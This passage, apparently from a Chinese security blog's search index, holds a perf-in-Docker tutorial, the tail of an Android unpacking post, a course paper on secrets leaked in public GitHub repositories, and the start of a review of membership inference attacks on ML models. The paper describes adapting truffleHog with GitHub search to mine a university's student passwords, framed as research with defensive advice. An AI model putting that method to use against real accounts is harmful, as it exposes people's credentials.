-Rl . ./43897952_dexfile_execute.dex ./2836792_dexfile_execute.dex ./2836792_classlist_execute.txt ./43897952_dexfile.dex ./2836792_dexfile.dex ./2836792_classlist.txt ./2836792_ins_4044.bin  进程被杀  03-10 21:37:40.391 1382 1419 I ActivityManager: Start proc 26247:com.founder.XXX/u0a105 for activity com.founder.XXX/.welcome.ui.SplashActivity 03-10 21:37:40.497 26247 26247 I ounder.shaoyan: The ClassLoaderContext is a special shared library. 03-10 21:37:40.557 1382 18390 I ActivityManager: Process com.founder.XXX (pid 26247) has died: fore TOP 03-10 21:37:40.557 1382 1420 W libprocessgroup: kill(-26247, 9) failed: No such process 03-10 21:37:40.558 1382 1420 I libprocessgroup: Successfully killed process cgroup uid 10105 pid 26247 in 0ms 03-10 21:37:40.558 772 772 I Zygote : Process 26247 exited due to signal (9) 03-10 21:37:40.564 772 772 W gdbus : type=1400 audit(0.0:1347): avc: denied { sys_nice } for capability=23 scontext=u:r:zygote:s0 tcontext=u:r:zygote:s0 tclass=capability permissive=0  ","date":"2021-11-05T23:04:43+08:00","permalink":"https://chinggg.github.io/post/fart/","tags":["Android","逆向"],"title":"安卓脱壳速成"},{"categories":["记录"],"contents":"perf 简介 性能调优基本原理 在了解具体的工具之前，我们首先应该问自己，性能分析要追踪和优化什么。我们都知道程序的运行会占用包括 CPU，内存，文件描述符，锁，磁盘，网络等等在内的各种操作系统资源。根据 Amdahl 定律，当其中的某一个或多个资源出现瓶颈的时候，我们需要找到程序中最耗费资源的地方，并对其优化。\n那么我们可能需要做如下这些事情:\n 对系统资源持续进行观测以及时发现哪些资源出现了瓶颈 统计各个程序(进程)，确定哪个或哪些进程占用了过多的资源 分析问题进程，找出其占用过量资源的原因  很多工具都可以用来要想获取这些信息，但它们本质上都是从操作系统提供的观测源查询数据，Linux 中的观测源被称为 event ，是不同内核工具框架的统一接口，大致有如下几种:\n Hardware Events: 基于 CPU 性能监视计数器 PMC Software Events: 基于内核计数器的低级事件。例如，CPU 迁移、主次缺页异常等等 Kernel Tracepoint Events: 硬编码在内核中的静态内核级的检测点，即静态探针 User Statically-Defined Tracing (USDT): 这些是用户级程序和应用程序的静态跟踪点 Dynamic Tracing: 可以被放置在任何地方的动态探针。对于内核和用户级软件，分别使用 kprobes 和 uprobes 框架 Timed Profiling: 以指定频率收集的快照。这通常用于CPU使用情况分析，其工作原理是周期性的产生时钟中断事件  而 perf 就是一个 Linux 系统中的性能分析工具，它可以利用 Hardware Events, Software Events, Tracepoint, Dynamic Tracing 来对应用程序进行性能分析，从开发者的角度来讲，它可以分析如下各种问题：\n 为什么内核消耗 CPU 高, 代码的位置在哪里？ 什么代码引起了 CPU 2级缓存未命中？ CPU 是否消耗在内存 I/O 上？ 哪些代码分配内存，分配了多少？ 什么触发了 TCP 重传？ 某个内核函数是否正在被调用，调用频率有多少？ 线程释放 CPU 的原因？  安装和使用 由于和内核的紧密关系，perf 的安装需要与内核版本相匹配，一般来讲使用发行版自带的包管理器安装即可，注意不同发行版下的包名称：\n Alpine: perf，v3.12 以上才可安装 Debian: linux-perf，注意 Debian 10 的软件源中默认只有 4.19 版本，若需 5.10 版本，可使用 buster-backports 源 Ubuntu: linux-tools-*，星号为内核版本号或 generic  如果确实无法用包管理器安装或版本不匹配，可以下载对应版本内核源码并解压，在 tools/perf 目录下自行编译。\n安装好 perf 后，可以用 perf --help 或 man perf 查看相应的帮助信息，下面仅介绍使用 perf 对应用进程进行分析的基本流程。\n首先使用 perf record -p \u0026lt;pid\u0026gt; -g 来跟踪指定进程，此时 perf 会在前台进行性能监测，并在当前目录生成 perf.data 文件，当需要终止监测时，按 C-c 等待 perf 退出。\n数据生成完毕后，可使用 perf report 在命令行下查看，如果想要可视化分析，可以结合 FlameGraph 这款工具生成 SVG 火焰图，命令如下：\ngit clone --depth=1 https://github.com/BrendanGregg/FlameGraph sudo perf script | FlameGraph/stackcollapse-perf.pl | FlameGraph/flamegraph.pl \u0026gt; flamegraph.svg  PS: perf timechart 本身也提供了导出 SVG 图片的功能，但需要 perf timechart record 来记录，而且输出的是进程运行过程中系统调度的情况，无法对程序的具体代码段进行性能分析。\nDocker 中运行 perf 实际场景中应用可能运行在 Docker 容器中，这时我们可以指定 PID 命名空间另开一个容器，使目标容器中的进程对其可见，然后在新开的容器中使用 perf 对应用进程进行分析，命令如下： docker run -it --pid=container:\u0026lt;目标容器ID\u0026gt; --network=container:\u0026lt;目标容器ID\u0026gt; \u0026lt;perf容器名\u0026gt;\n但由于 Docker 出于安全考虑对系统调用 perf_event_open 进行了限制，在执行 perf 的过程中可能出现如下 Permission Error：\nperf_event_open(..., PERF_FLAG_FD_CLOEXEC) failed with unexpected error 1 (Operation not permitted) perf_event_open(..., 0) failed unexpectedly with error 1 (Operation not permitted) You may not have permission to collect stats. Consider tweaking /proc/sys/kernel/perf_event_paranoid: -1 - Not paranoid at all 0 - Disallow raw tracepoint access for unpriv 1 - Disallow cpu events for unpriv 2 - Disallow kernel profiling for unpriv  一般可以通过三种方式解决：\n 查看宿主机 /proc/sys/kernel/perf_event_paranoid 的值，设为 -1，这样非特权用户也能调用 perf_event_open 了 在 docker run 时加上参数 --cap-add CAP_SYS_ADMIN 及 --privileged，赋予容器特权 下载一份 seccomp 默认配置文件 ，在其中给 perf_event_open 放行，保存为 custom.json，在 docker run 时加上参数 --security-opt seccomp=custom.json  在容器本身来源可靠的情况下，第二种方式应该是较为安全且方便的，下面就给出 Dockerfile 样例：\nFROM alpine:latest RUN sed -i.bak 's/dl-cdn.alpinelinux.org/mirrors.cloud.tencent.com/g' /etc/apk/repositories RUN apk add --update bash vim git perf perl thttpd RUN git clone --depth=1 https://github.com/BrendanGregg/FlameGraph RUN echo 'perf record -g -p $1' \u0026gt; record.sh \u0026amp;\u0026amp; \\ echo 'perf script | FlameGraph/stackcollapse-perf.pl | FlameGraph/flamegraph.pl \u0026gt; $1' \u0026gt; plot.sh \u0026amp;\u0026amp; \\ chmod +x *.sh ENTRYPOINT [\u0026quot;bash\u0026quot;]  为方便使用编写了一键运行脚本：\n#!/bin/bash set -x target_container_id=\u0026quot;$1\u0026quot; version=\u0026quot;$(uname -r)\u0026quot; version=\u0026quot;${version%%-*}\u0026quot; version=\u0026quot;${version%.*}\u0026quot; tag=\u0026quot;v${2-$version}\u0026quot; if [[ $tag != \u0026quot;v5.4\u0026quot; \u0026amp;\u0026amp; $tag != \u0026quot;v5.10\u0026quot; ]]; then tag=\u0026quot;latest\u0026quot; fi image=${3-\u0026quot;perf\u0026quot;} docker run \\ --cap-add CAP_SYS_ADMIN \\ --privileged \\ -ti \\ --rm \\ --pid=container:$target_container_id \\ --network=container:$target_container_id \\ $image:$tag  复制以上代码保存为 attach.sh，执行 attach.sh \u0026lt;目标容器ID\u0026gt; 就进入了 perf 容器，此时可以使用 ps 查看目标容器中的进程，记下 pid 后执行 record.sh \u0026lt;pid\u0026gt; 开始记录，记录完成后运行 plot.sh \u0026lt;图片名.svg\u0026gt; 生成火焰图。\n导出图片一般可使用 docker cp 和 docker exec 或挂载 volume，为方便预览和复制文件，容器内置了轻量网页服务，执行 thttpd -p \u0026lt;端口号\u0026gt; 即可。由于脚本中没有设置端口转发，需要 docker inspect \u0026lt;目标容器ID\u0026gt; | grep IPAdress 查看目标容器的 IP，然后在浏览器中访问即可。若需要更灵活的操作，可不用以上脚本手动添加参数运行容器。\n扩展阅读 perf 及 Linux 性能调优：\n Linux perf examples，FlameGraph 作者 Brendan Gregg 本人撰写，非常全面 Linux 性能调优系列中文博客，其中有两篇博文分别介绍 perf 的原理和使用 perf 原理和實務 性能分析利器之perf浅析 Why \u0026lsquo;perf\u0026rsquo; needs to match the exact running Linux kernel version?  Docker 中使用 perf:\n Tutorial: Profiling Rust applications in Docker with perf 详细可操作的教程，调试目标为 Rust 程序 running perf in docker \u0026amp; kubernetes  分析 .NET 应用：\n Debug high CPU usage in .NET Core Profiling .NET Core app on Linux  ","date":"2021-09-09T15:46:57Z","permalink":"https://chinggg.github.io/post/docker-perf/","tags":["调试技巧","Docker"],"title":"在 Docker 中运行 Linux 性能分析工具 perf"},{"categories":["论文"],"contents":"基本信息 摘要: GitHub 等平台使得软件协同开发的公开进行成为常态，但当公开的代码中涉及到密钥管理时，问题也随之而来，开发过程中将 API Key 或私钥添加进代码中使意外的私密泄露频繁发生。在本文中，我们将首先介绍 Git 和 GitHub Search API 等预备知识，然后对 NDSS 2019 获奖论文 How Bad Can It Git 进行回顾。最后我们还将展示针对高校学生群体的研究，结果反映公共代码仓库中的私密信息泄露无处不在，且不限于 API 和密码学意义上的私钥。尽管该问题具有较大的现实意义，但学术界对此兴趣不大，而企业已经开始应用机器学习技术尝试治理生产环境中的敏感信息泄露问题，这或许是将来的解决方案。\n关键词：数据安全，信息泄露，GitHub，自动化扫描\nAbstract: GitHub and similar platforms have made public collaborative development of software commonplace. However, problems arise when this public code must manage authentication secrets, such as API keys or cryptographic secrets, which must be kept private for security, yet common development practices like adding these secrets to code make accidental leakage frequent. In this paper, we will firstly introduce Git and GitHub Search API to provide prerequisite knowledge then review NDSS 2019 accepted paper How Bad Can It Git. And we will present our new work targeted at college students, which shows that the secret leakage on public repository platforms is ubiquitous and not limited to API keys and cryptographic secrets. Despite the severity of the problem, little academic research has been done on this topic, though some companies have been applying machine learning to prevent sensitive data leakage, which may be a promising solution in the future.\nKeywords: Data Security, Information Leakage, GitHub, Automatic Scanning\n前言 研究背景 自 GitHub 开放搜索功能以来，就有人意识到了这是一把双刃剑，别有用心者通过检索特定关键字可以轻松挖掘想要的信息，如果说邮箱地址、家庭住址等个人信息泄露仅仅是恶化了本就不容乐观的隐私状况，那私钥泄露就是真正切切地对个人和团队的资产安全造成严重威胁。而在 NDSS 2019 上，Michael Meli 等人展示了他们对 GitHub 公共仓库进行长达半年的大规模筛查后的成果，证明了 GitHub 上每天都发生着数以千计的 API Key 与非对称私钥泄露，公共代码库中的私密信息泄露还是一个亟待解决的问题。尽管企业已经着手开始主动扫描自己是否泄露了信息，他们和攻击者一样面临着同样的问题，也就是扫描的低效和较多的误报漏报。\n本文研究内容及目标 本文首先将介绍 Git 存储数据的原理以及 GitHub 等平台的相关背景信息，然后对 NDSS 2019 会议论文 How Bad Can It Git 进行复盘，介绍其研究方法与成果，并尝试以高校学生为目标群体小规模地复现，在不同的时空环境证明该问题依然存在。由于学术界对此研究并不充分，我还将介绍企业在基于机器学习的敏感信息泄露治理上进行的探索。\n预备知识 本章介绍 Git 存储数据的原理以及 GitHub 等平台的相关背景信息。\nGit 存储原理概述 为了对克隆到本地的 Git 代码仓库进行检索，需要对 Git 存储文件的方式和原理有所了解。\nGit 不仅仅是一个版本控制系统，其本质是一个内容寻址的文件系统，它的对象模型自底向上可以分为 blob，tree，commit 这三个层次。blob 只存储单个文件的内容，包括文件名在内的其他属性都保存在 tree 的记录中，tree 就像是 UNIX 文件系统中的目录，可以包含多条记录，每条记录含有一个指向 blob 对象或者 tree 对象的 SHA-1 指针，以及相应的模式、类型、文件名信息。而一个 commit 就是某一时刻保存的完整快照，它包含指向最顶层树的 tree 对象以及可能存在的父 commit 对象的 SHA-1 指针以及提交者等信息。\nGit 中的一个 commit 就是一个版本，与 SVN 等只存储版本间差异部分的版本控制系统不同，Git 会存储每一个 commit 的完整快照，但这并不会造成空间浪费，因为内容相同的对象具有相同的 SHA-1 值，在仓库中始终只会被保存一次。\nHEAD 是指向当前 commit 的指针，若不考虑暂存区，则当前工作目录下的文件就是当前 commit 中包含的文件，用户随时可以使用 git checkout 切换到某 commit，但当用户发现自己在代码中泄露密码后却往往会忘记这点，删去密码后新增 commit 便以为高枕无忧，实则已将密码永远泄露。\nGitHub 搜索功能 GitHub 提供了易用且强大的搜索功能，在搜索框里就能一键检索仓库、代码、用户、commit 等十种类型的信息，鼠标点击即可指定只显示某种编程语言的仓库或代码，还可以使用高级搜索的语法实现更精确的检索。作为服务程序员的网站，GitHub 并不参与被爬与反爬的猫鼠游戏，而是提供了丰富的 API 以便进行各类操作，其中就包括搜索，任何人只需调用短短几行代码即可获得标准的 JSON 数据，但未认证用户限制每分钟 10 次请求，用户使用 token 等方式验证后限制每分钟30次请求，而且最多返回1000条结果。\n对于代码的搜索更为特殊，在 2013 年，GitHub 限制了对代码搜索 API 的调用必须指定对某一用户或某一仓库进行(https://developer.github.com/changes/2013-10-18-new-code-search-requirements/)。但网页版中已登录的用户完全可以在所有仓库中搜索特定代码，经过测试后发现调用 API 时给出 token 也就无需指定搜索范围，耐人寻味的是这并未在官方 API 文档中给出说明。尽管做出这些限制的首要目的可能是降低成本、减轻服务器压力，但一定程度上也能阻止大规模的恶意行为。\n需要注意的是 GitHub 对搜索频率有着较大的限制，已登录的用户每小时也最多发起 5000 次 API 调用请求，尽管后文将提到 Meli 等人证明在此限制下也能做到对 GitHub 仓库 99% 的实时覆盖率，但这对我们的复现有着一定的影响，因为将搜索列表中的仓库克隆至本地前其实可以对每个仓库再调用 API 进一步获得仓库大小等信息作为筛查标准，但这样将很快触发频率上限。\nNDSS 2019 论文研究概述 本章将介绍 Michael Meli 等人在 NDSS 2019 发表的论文 How Bad Can It Git，Meli 等人并不是第一个研究 GitHub 公共仓库中私密信息泄露的团队，但他们第一次对该问题进行了大规模深入分析，综合运用各种方法进行检测，最终证明了问题的广泛存在。\n侦测秘密的方法 可分为四个阶段，如下图所示：\n确定目标私密信息的种类：主要是 Google，Amazon 等公司用于提供服务的 API Key 或 Access Token，以及由 RSA 等非对称加密算法生成的私钥，它们都有较固定的特征将其与无效的随机字符串区分开来，而人们在日常生活中更广泛使用的各类帐号密码通常是不定长度的字符组合，因此不在收集之列。最终划定了 15 种 API Key 与 4 种私钥，详见下表：\n文件收集：作者利用了两种互补的渠道。其一是 GitHub 提供的搜索 API，由于其不支持使用正则表达式搜索，作者先使用关键词查找以划定范围，再将其下载至本地以备进一步筛查，频率上的限制也并不构成障碍，只需设置返回结果按被索引时间排序，就可做到类似实时查询的效果，在实施了连续 6 个月的不间断查询后，作者发现这足以达到 99% 的文件覆盖率。其二是 Google BigQuery 上的公共数据集，它每周对 GitHub 上 13% 的开源仓库进行快照，支持进行 TB 级别的大数据查询，用户可以在 SQL 语句中使用正则表达式，但其对正则表达式的支持程度不足以精准地匹配到结果，作者将 2018 年 4 月 4 日的快照下载到了本地用于筛查。\n本地正则扫描：由于上述两种渠道无法进行在线精准查找，需要将其下载到本地，使用预先设计好的正则表达式匹配得到候选结果。\n对候选结果进行筛查：不在目标范围内的其他字符串也有一定几率通过正则匹配，作者使用了三种方法排除可能的假阳性结果：\n 信息熵筛选，每种密钥的随机程度差距应当不大，故对于每一个字符串，计算其香农信息熵，若偏离该种密钥信息熵的平均值超出三个标准差则将其排除。 单词筛，随机生成的密钥不太可能包含英语单词，为了在精确率和召回率之间保持平衡，作者将单词的范围限定为代码中常见的两千多个，且最短长度为5。 模式筛，随机生成的字符串不太可能具有某种数学上的模式，比如重复的字符，连续递增或递减的字符，若候选结果包含这样的模式且其长度超过4则将其排除。  实验结果分析 可将作者实验后得到的结果整理成如下表格：\n    GitHub Seach API BigQuery     收集仓库总数 681,784 3,374,973   收集文件总数 4,394,476 2,312,763,353   候选仓库数量 109,278 52,117   候选文件数量 307,461 100,179   候选文件命中率 约 7% 约 0.005%   候选字符串数量（含重复） 403,258 172,295   候选字符串数量（不含重复） 134,887 73,799   有效字符串数量 133,934 73,079    尽管 BigQuery 提供了 TB 级的海量数据，但从中获得的有效文件却反而更少，这可能是因为 BigQuery 只搜集具有明确 License 的仓库，这些仓库通常更加具有规范性，在其中泄露信息的可能性就相对较低。但并不能仅凭数量上的比较就认为 BigQuery 在收集信息方面不如 GitHub Search API 有用，因为作者发现仅有 3.49% 的有效字符串同时出现在两者的结果中，这说明两种渠道在很大程度上是互补的。\n除了对泄露信息的数量进行分析，作者还研究了受害者「亡羊补牢」行为发生的几率与意义，结果表明约 10% 的私密信息在 1 天内被删除， 约 20% 的私密信息在 2 周内被删除，余下约 80% 的受害者完全没有意识到自己泄露了密码。不过根据作者的研究，如果持续不断地调用 GitHub Search API 进行扫描，当秘密被上传至 GitHub 后，平均只需 20 秒就能够检测出来，因此「亡羊补牢」真的为时已晚。除此之外，作者还发现信息泄露与开发者的身份经验没有多大关联，所以任何人都有可能在不经意间泄露自己的密钥。\n针对高校学生群体的私密信息泄露研究 距离 NDSS 2019 上这篇论文发布以来，国际形势的巨大变化也影响了开源世界的面貌，首先是中美贸易战的持续升温，美国对华为等公司的制裁在国内引发了对“开源自立”的需求(https://www.oschina.net/news/106836/opensource-ourself)，Gitee 寄托着人们的希望乘势而起，却又始终难以替代 GitHub 的开发者生态；其次是新冠疫情的肆虐让远程协同开发成为摆在人们面前的现实，最后还不得不提到微软于 2018 年 6 月 4 日收购 GitHub 这件大事，因为 Meli 等人对 GitHub 的挖掘是其被收购前进行的，GitHub 被微软收购后并没有如最初人们所担心的那样毁于微软之手，相反微软的财力支持使得 GitHub 能够免费为个人用户提供无限的私有仓库，而在此之前 GitHub 的私有仓库是收费功能，这是一项重大变化。\n本文原打算将研究对象设为国内最大的代码托管平台 Gitee（码云），以对比其与 GitHub 在私密信息泄漏上的差异，但发现 Gitee 的 API 极为有限，曾经推出代码搜索的功能却又不知何时悄然下线，目前仅支持搜索仓库、Issue 和博客的搜索，正常用户的搜索体验都难以保障，想要挖掘私密信息更是无从下手。\n因此本文仍将以 GitHub 作为挖掘信息的对象，但与 Meli 等人主要研究 API Key 或非对称加密算法的私钥不同，本文将探讨针对特定群体挖掘其个人账户信息的可能性。\n现有工具分析 truffleHog 是一个能够深入搜寻 Git 仓库自动挖掘私密信息的工具，它的工作原理并不复杂：借助于 GitPython 模块，它可以将远程的 Git 仓库克隆至本地，然后从某一分支的某一 commit 开始向遍历，每次将前一 commit 与后一 commit 的 diff 转化成字符串，再基于正则表达式匹配和信息熵分析找出可疑字符串，利用 bcolors 模块将其标注成特殊颜色，然后将其所属 commit 等元信息一并封装后添加到返回的结果中。\nGitDorker 则是一个利用 GitHub Search API 进行批量查询的工具，它不会将仓库克隆至本地而仅仅只会使用关键字查询，但其提供了较丰富的命令行参数，可以对用户、组织、文件进行搜索，而且提供了对频率限制的等待处理，可以将其作为外围信息搜集的工具来限定仓库范围。\n时间所限，本文并未研发新的工具，而是借鉴了 GitDorker 的思想，在 truffleHog 的基础上新增了对 GitHub Search API 的调用，得到目标 URL 的列表后让 truffleHog 可以对多个目标进行批量扫描，访问 https://gitee.com/libgen/truffleHog 可查看所有代码及开发记录\n跨时空的复现 尽管国内高校学生群体中 GitHub 的流行程度可能不是很高，但总人数还是颇为可观，不少学生以开源项目贡献者的身份活跃，也有人只是默默将平时所做的课程项目上传，总体来说还是围绕校园生活居多，比如模拟选课系统与教务管理系统等。尤其是随着疫情的到来，许多学生自发编写维护了一些便利日常生活的小脚本，这种开源共享的精神值得赞许，但背后却也隐藏着不小的安全隐患。这些程序虽功能各异，但却往往都会使用学号与密码向学校服务器发送登录请求，稍有不慎忘记删除测试时使用的帐号密码便公开上传至 GitHub。\n泄密从开始到最终完成需要受害者和攻击者双方的共同努力，若无有效的挖掘方法，则学号密码的泄露较难构成系统性的风险，本文将以上海某大学为例，证明仅在现有工具的基础上稍作修改就可自动进行针对大学生群体的密码挖掘。\n与 API Key 和 RSA 等非对称加密算法不同，学生的密码通常是不定长度的数字字符组合，难以使用正则表达式规定，但学号的结构相对较为固定，故而能够使用正则表达式进行匹配。不过仅凭学号本身去搜寻无疑于大海捞针，要想缩减查找范围，必须引入外部信息，注意到学号姓名往往用于登录学校帐号，故可以想到先调用 GitHub Search API 搜索包含学校域名的代码，获取到对应的仓库即可加入候选列表，然后将候选列表中的这些仓库下载至本地进行分析与筛选即可。\n在对结果进行手动分析的过程中，发现了较多的假阳性数据，这与 Meli 等人的研究得出的结论不同，在他们的研究中 99% 的候选字符串都通过了三轮筛查故被认为是有效的，这可能是由于 API Key 和非对称私钥的特征更为显著故而可用正则表达式精准地匹配，也不排除 Meli 等人的筛查效果其实不佳，没能够找出真正的假阳性数据。\n观察假阳性数据的来源仓库，发现尽管使用了学校域名作为限制，但结果中仍会出现来自世界各地的奇怪仓库，这一方面是由于该学校曾经搭建过开源镜像站，许多仓库中将开源镜像站的网址写入了文件中，故而被添加到了候选结果；另一方面是由于一些仓库中存放了大量爬取的数据，许多网页中都可能包含该学校域名，这些仓库往往体积巨大且有较多 commit，需要耗费大量时间扫描。\n在对泄密文件的类型和具体字符串进行统计后，我们发现 Python 源码的数量一骑绝尘，是第二名 jsx 的两倍之多，但 jsx 理论上很少用于存放敏感信息，经观察发现这只是正好有仓库的 jsx 文件中出现了大量符合学号规则的同一数字，故而 jsx 中全为假阳性数据，真正排第二的泄密文件类型应当是 Java 源码，高校学生经常用 Python 编写脚本，用 Java 编写后端代码，故而这两种文件类型中理应泄密较多。这可能也反映了学生尚未养成将配置与代码分离的习惯，倾向于在代码中硬编码账号密码等个人信息，而较少使用单独配置文件，故非代码文件中的往往是假阳性数据。\n针对以上场景，本文使用了三种筛法：\n 仓库体积筛，我们认为大学生自建仓库的文件体积一般不超过 100 MB，体积更大的仓库也更可能无关核心代码而只是大量数据的杂乱堆砌，将之排除能减轻网络负担。GitHub 关于单个仓库的 API 返回了仓库体积的信息，使得我们可以免于克隆整个仓库而判断体积大小，但代价是对每个仓库都进行了一次 API 调用，容易达到每小时 5000 次的总调用次数上限。 仓库 commit 数筛，我们认为大学生自建仓库的 commit 数一般不超过 500，commit 数更多则该仓库更可能是类似博客的仓库，会自动提交生成大量无用静态文件，将之排除能减少扫描所耗时间 文件类型筛，我们发现 Python 源码中泄露的信息最多，各种源码和配置文件中也都有泄露信息的可能，多数假阳性数据都出现在各种非代码类型的文件中，多数假阳性数据都出现在各种非代码类型的文件中，故而使用黑名单或白名单可以提高命中率，我们同样通过 GitPython 模块实现了黑名单功能。  经过上述筛查之后，扫描的准确程度有了较大提高，具体数量这里就不作展示，只能说高校学生在参与开源的同时必须提高自身的安全意识，如图所示为不了解 Git 原理而导致的典型密码泄漏：\n面向个人的安全措施 各大公司已经开始与 GitHub 合作以扫描泄露的 API Key 并向用户报警，但高校学生群体显然只能依靠自己，现在总结出一些安全措施：\n 从源头着手，既然 GitHub 已向个人用户免费开放私有仓库，那么可以优先考虑使用私有仓库 从代码着手，需要避免密码进入源文件，可以使用环境变量或单独的文件存储密码 从检查着手，可以在上传之前使用 git-secret 等工具检测是否 commit 了私密信息 从追溯着手，可以使用现成的扫描工具定期对自己的仓库进行扫描并发送提醒  总结与展望 本文介绍了 GitHub 信息泄露问题的背景以及 NDSS 2019 上的相关研究成果，并针对高校学生群体的帐号泄露问题进行了探讨，并给出了一些安全措施。撰写本文的后期，我才意识到到此前仅仅关注了学术界的有限工作，而工业界已经从企业安全防护的角度对此进行了深度实践，比如阿里安全专家止介曾做过 Github 敏感信息泄露监控的专题报告，还开源了 GSIL 这款功能更为强大的工具，腾讯宙斯盾流量安全分析团队还探索了基于机器学习的敏感信息泄露治理。这一问题或许并不是学术界关注的热点，这可能是由于无法使用数学方法定量研究而显得不那么有技术含量，但频频爆出的信息泄露问题证明了其仍然具有很大的现实意义。遗憾的是由于各方面的限制，我仅仅进行了小规模的复现验证了问题的存在，希望将来可以跟踪业界的最新进展，进行更高效精准的信息挖掘与监控。\n参考文献 [1]\tMeli, Michael, Matthew R. McNiece, and Bradley Reaves. \u0026ldquo;How Bad Can It Git? Characterizing Secret Leakage in Public GitHub Repositories.\u0026rdquo; NDSS. 2019.\n[2]\tRussell, Matthew A. Mining the social web: data mining Facebook, Twitter, LinkedIn, Google+, GitHub, and more. \u0026quot; O\u0026rsquo;Reilly Media, Inc.\u0026quot;, 2013.\n[3]\tKnothe, David, and Frederick Pietschmann. \u0026ldquo;Large-Scale-Exploit of GitHub Repository Metadata and Preventive Measures.\u0026rdquo; arXiv preprint arXiv:1908.05354 (2019).\n[4]\tCosentino, Valerio, Javier Luis Cánovas Izquierdo, and Jordi Cabot. \u0026ldquo;Findings from GitHub: methods, datasets and limitations.\u0026rdquo; 2016 IEEE/ACM 13th Working Conference on Mining Software Repositories (MSR). IEEE, 2016.\n[5]\tKalliamvakou, Eirini, et al. \u0026ldquo;An in-depth study of the promises and perils of mining GitHub.\u0026rdquo; Empirical Software Engineering 21.5 (2016): 2035-2071.\n[6]\tLazarine, Ben, et al. \u0026ldquo;Identifying Vulnerable GitHub Repositories and Users in Scientific Cyberinfrastructure: An Unsupervised Graph Embedding Approach.\u0026rdquo; 2020 IEEE International Conference on Intelligence and Security Informatics (ISI). IEEE, 2020.\n[7]\thttps://shafiul.github.io/gitbook/1_the_git_object_model.html\n[8]\thttps://developer.github.com/changes/2013-10-18-new-code-search-requirements/\n[9]\thttps://docs.github.com/en/rest/reference/search#search-code\n[10] https://www.oschina.net/news/106836/opensource-ourself\n[11]\thttps://github.blog/2019-01-07-new-year-new-github/\n[12]\thttps://blog.gitee.com/2020/03/24/gitee-search/\n[13]\thttps://security.tencent.com/index.php/blog/msg/177\n[14]\thttps://feei.cn/wp-content/uploads/2020/09/Github敏感信息泄露监控.pdf\n[15]\thttps://www.yuque.com/feei/esbp/gsil\n","date":"2021-06-09T13:46:52Z","permalink":"https://chinggg.github.io/post/git-leaks/","tags":["安全","课程论文","隐私保护"],"title":"Secret Leakage in Public GitHub Repositories"},{"categories":["论文"],"contents":"前言 本文将对 NDSS (Network and Distributed System Security Symposium) 2019 获奖论文 ML-Leaks: Model and Data Independent Membership Inference Attacks and Defenses on Machine Learning Models 进行解读。这篇论文的主要研究内容是针对机器学习模型的成员推理攻击（membership inference attack）以及对应的防御机制，其价值在于证明了经过改进后的成员推理攻击具有较低的成本和较强的可行性，从而构成更现实的威胁。\n论文地址：https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_03A-1_Salem_paper.pdf\n源码地址：https://github.com/AhmedSalem2/ML-Leaks\n论文作者：Ahmed Salem, Yang Zhang, Mathias Humbert, Pascal Berrang, Mario Fritz, Michael Backes\n正文 研究背景 机器学习已经成为许多现实应用的核心，互联网巨头如 Google 和 Amazon 已经在推广机器学习即服务（MLaaS）的模式，用户可以上传自己的数据集，服务器返回给用户一个训练好的机器学习模型，通常是一个黑盒 API。尽管机器学习模型已得到广泛应用，但它在安全和隐私上却易受攻击，如模型逆向（model inversion）、对抗样本（adversarial examples）和模型提取（model extraction）。\n本文关注的是成员推理攻击（membership inference attack），攻击者的意图是得知某个数据是否被用于训练机器学习模型，这种攻击可能引发严重的后果，比如一个机器学习模型在来自特定疾病患者的数据上训练，攻击者通过得知受害者的数据属于模型的训练集就能立刻推知其健康状况。\n早在2017年，Shokri 等人第一次展示了针对机器学习模型的成员推理攻击，大致思路是使用多个攻击模型（attack models）来对目标模型（target model）的输出，即后验概率（posterior probabilities），进行成员推理。考虑到目标模型是一个黑盒 API，Shokri 等人构造了多个影子模型以模拟目标模型的行为并导出训练攻击模型所需的数据，即后验和真实（ground truth）的成员情况。\nShokri 等人的工作基于两个主要假设。首先，攻击者需要建立多个影子模型模型，每个模型与目标模型具有相同的结构，这可以通过使用与训练目标模型相同的 MLaaS 实现。第二，用于训练影子模型的数据集来自与目标模型的训练数据相同的分布，这一假设适用于对大部分攻击的评估。Shokir 等人也进一步提出了合成数据来放宽这一假设，但由于效率原因这种方法只能适用于包含二值特征的数据集。\n这两个较强的假设减少了对机器学习模型进行成员推理攻击的攻击面，本文将逐步放宽这些假设，以表明更广泛适用的攻击场景是可能的，同时也提出了两种防御机制。\n准备工作 本文主要关注分类问题，机器学习中的分类器就是一个函数，其将一个数据点（多维特征向量）映射成一个输出向量$\\mathcal{M(X)=Y}$，$\\mathcal{Y}$ 的长度等于类别的个数，大多数情况下 $\\mathcal{Y}$ 可被解释成在所有类别上后验概率的集合， $\\mathcal{Y}$ 中所有值的和为1。\n而成员推理攻击的攻击模型可表示成如下函数 $\\mathcal{A}:X_{Target},\\mathcal{M,K}\\rightarrow{0,1}$，其中 $X_{Target}$ 为目标数据点，$\\mathcal{M}$ 为训练后的模型（称为目标模型），$\\mathcal{K}$ 为攻击者的外部知识，结果为0表示目标数据点不是目标模型训练集 $\\mathcal{D}_{Train}$ 的成员，为1则反之。\n本文利用8个不同的数据集进行实验，其中6个与 Shokri 等人使用的数据相同，即MNIST、CIFAR-10、CIFAR-100、Location、Purchase、Adult。按照相同的程序对所有这些数据集进行预处理。此外，本文还利用了另外两个数据集，即 News 和 Face，来进行评估。\n三轮攻击 从表格中可看出，每一轮攻击都减少了一两个假设，攻击者对目标模型和数据的了解可以越来越少，不禁让人联想起电影《倚天屠龙记》中张三丰教张无忌太极拳，招式忘得愈多，反而学得愈深，颇有老子“绝圣弃智”，“不出于户，以观天下”的味道。\n攻击一：不知模型 本轮攻击主要放宽了影子模型设计上的假设，只需使用1个影子模型而且无需知晓目标模型的结构，就可实施高效且廉价的成员推理攻击。不过，训练影子模型时仍需假设影子数据集 $\\mathcal{D}_{Shadow}$ 和目标模型的训练数据来自相同的分布。\n单一影子模型 这里进一步假设影子模型运用算法和超参数和目标模型相同，在实践中做到这点，攻击者可以使用和目标模型相同的 MLaaS 平台，后面将展示这个假设也可被放宽。\n攻击策略有以下三个阶段：\n 影子模型训练：攻击者首先将的影子数据集 $\\mathcal{D}_{Shadow}$ 分成两份，用训练集训练影子模型。 攻击模型训练：攻击者用训练过的影子模型对所有影子数据进行预测，获得后验概率向量，每个数据点取最大的三个值（若为二元分类则取两个）。一个特征向量被标记为1或0分别代表对应的数据点在或不在测试集中，产生的特征向量和标记接着就被用于训练攻击模型。 